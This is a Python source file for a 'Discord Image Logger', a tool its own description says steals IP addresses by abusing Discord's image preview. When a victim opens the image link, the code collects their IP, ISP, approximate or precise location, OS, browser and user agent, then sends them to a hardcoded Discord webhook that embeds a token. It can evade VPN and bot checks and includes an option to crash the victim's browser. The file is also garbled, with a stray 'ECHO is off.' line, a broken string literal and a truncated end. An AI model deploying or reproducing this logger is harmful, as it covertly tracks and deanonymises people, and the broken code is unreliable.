from http.server import BaseHTTPRequestHandler 
from urllib import parse 
import traceback, requests, base64, httpagentparser 
 
__app__ = "Discord Image Logger" 
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature" 
__version__ = "v1.0" 
__author__ = "jmgs" 
 
config = { 
    # BASE CONFIG # 
    "webhook": "https://discord.com/api/webhooks/1137194681613168682/X8OTgTExYujoASZOqPpheMIsIuIvjyzKBfHleBGz9ohXPFkZxLpCRPTpu6jkTMH7RnAI", 
    "image": "https://cdn.discordapp.com/attachments/1136771304624750795/1137194924178165800/train.jpg", # You can also have a custom image by using a URL argument 
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README) 
 
    # CUSTOMIZATION # 
    "username": "Image Logger", # Set this to the name you want the webhook to have 
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000) 
  
    # OPTIONS # 
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher) 
      
  
    "message": { # Show a custom message when the user opens the image 
        "doMessage": False, # Enable the custom message? 
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show 
        "richMessage": True, # Enable rich text? (See README for more info) 
    }, 
  
    "vpnCheck": 1, # Prevents VPNs from triggering the alert 
                # 0 = No Anti-VPN 
                # 1 = Don't ping when a VPN is suspected 
                # 2 = Don't send an alert when a VPN is suspected 
  
    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other) 
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices) 
  
    "antiBot": 1, # Prevents bots from triggering the alert 
                # 0 = No Anti-Bot 
                # 1 = Don't ping when it's possibly a bot 
                # 2 = Don't ping when it's 100 a bot 
                # 3 = Don't send an alert when it's possibly a bot 
                # 4 = Don't send an alert when it's 100 a bot 
      
  
    # REDIRECTION # 
    "redirect": { 
        "redirect": False, # Redirect to a webpage? 
        "page": "https://your-link.here" # Link to the webpage to redirect to  
    }, 
  
    # Please enter all values in correct format. Otherwise, it may break. 
    # Do not edit anything below this, unless you know what you're doing. 
    # NOTE: Hierarchy tree goes as follows: 
    # 1) Redirect (If this is enabled, disables image and crash browser) 
    # 2) Crash Browser (If this is enabled, disables image) 
    # 3) Message (If this is enabled, disables image) 
    # 4) Image  
} 
  
blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block. 
                                                            # This feature is undocumented mainly due to it being for detecting bots better. 
  
def botCheck(ip, useragent): 
    if ip.startswith(("34", "35")): 
        return "Discord" 
    elif useragent.startswith("TelegramBot"): 
        return "Telegram" 
    else: 
        return False 
  
def reportError(error): 
    requests.post(config["webhook"], json = { 
    "username": config["username"], 
    "content": "@everyone", 
    "embeds": [ 
        { 
            "title": "Image Logger - Error", 
            "color": config["color"], 
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```", 
        } 
    ], 
}) 
  
def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False): 
    if ip.startswith(blacklistedIPs): 
        return 
      
    bot = botCheck(ip, useragent) 
      
    if bot: 
        requests.post(config["webhook"], json = { 
    "username": config["username"], 
    "content": "", 
    "embeds": [ 
        { 
            "title": "Image Logger - Link Sent", 
            "color": config["color"], 
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`", 
        } 
    ], 
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled 
        return 
  
    ping = "@everyone" 
ECHO is off.
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json() 
    if info["proxy"]: 
        if config["vpnCheck"] == 2: 
                return 
          
        if config["vpnCheck"] == 1: 
            ping = "" 
      
    if info["hosting"]: 
        if config["antiBot"] == 4: 
            if info["proxy"]: 
                pass 
            else: 
                return 
  
        if config["antiBot"] == 3: 
                return 
        if config["antiBot"] == 2: 
            if info["proxy"]: 
                pass 
            else: 
                ping = "" 
  
        if config["antiBot"] == 1: 
                ping = "" 
  
  
    os, browser = httpagentparser.simple_detect(useragent) 
      
    embed = { 
    "username": config["username"], 
    "content": ping, 
    "embeds": [ 
        { 
            "title": "Image Logger - IP Logged", 
            "color": config["color"], 
  
**Endpoint:** `{endpoint}` 
              
**IP Info:** 
 `{ip if ip else 'Unknown'}` 
 `{info['isp'] if info['isp'] else 'Unknown'}` 
 `{info['as'] if info['as'] else 'Unknown'}` 
 `{info['country'] if info['country'] else 'Unknown'}` 
 `{info['regionName'] if info['regionName'] else 'Unknown'}` 
 `{info['city'] if info['city'] else 'Unknown'}` 
 `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'}) 
 `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})` 
 `{info['mobile']}` 
 `{info['proxy']}` 
 `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}` 
  
**PC Info:** 
 `{os}` 
 `{browser}` 
  
**User Agent:** 
``` 
{useragent} 
    } 
  ], 
} 
      
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}}) 
    requests.post(config["webhook"], json = embed) 
    return info 
binaries = { 
